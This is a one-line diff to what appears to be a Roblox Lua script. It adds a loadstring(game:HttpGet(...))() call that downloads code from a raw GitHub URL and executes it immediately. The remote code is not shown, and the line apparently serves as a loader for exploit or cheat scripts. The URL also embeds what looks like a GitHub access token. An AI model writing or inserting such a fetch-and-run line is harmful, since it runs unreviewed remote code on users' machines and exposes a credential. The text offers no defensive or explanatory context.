@@ -1,1 +1,1 @@
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/akdo3/Send/refs/heads/main/akdo?token=GHSAT0AAAAAAC5JXQYNEDIPLNIPLMKW7IMYZ4XLZBA"))()
